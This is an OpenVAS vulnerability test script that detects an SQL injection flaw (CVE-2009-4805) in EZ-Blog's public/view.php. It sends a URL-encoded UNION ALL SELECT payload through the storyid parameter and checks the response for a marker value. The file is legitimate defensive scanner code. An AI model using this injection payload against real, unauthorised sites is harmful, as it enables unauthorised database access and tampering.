###############################################################################
# OpenVAS Vulnerability Test
#
# EZ-Blog 'public/view.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (C) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100012");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2009-03-06 13:13:19 +0100 (Fri, 06 Mar 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-4805");
  script_bugtraq_id(33947);
  script_name("EZ-Blog 'public/view.php' SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Update to a newer version if available.
  or set 'magic_quotes_gpc = On' in php.ini.");

  script_tag(name:"summary", value:"EZ-Blog is prone to an SQL-injection vulnerability because it fails to
  sufficiently sanitize user-supplied data before using it in an SQL query.

  Exploiting this issue could allow an attacker to compromise the application,
  access or modify data, or exploit latent vulnerabilities in the underlying
  database.

  EZ-Blog Beta 1 is vulnerable, other versions may also be affected.");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/ez-blog/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/blog", "/ezblog", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/public/view.php?storyid=-1%27%20UNION%20ALL%20SELECT%201,2,132323231,4,5,6,7,8,9,10%23");

  if(http_vuln_check(port:port, url:url,pattern:"Category: 132323231")) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
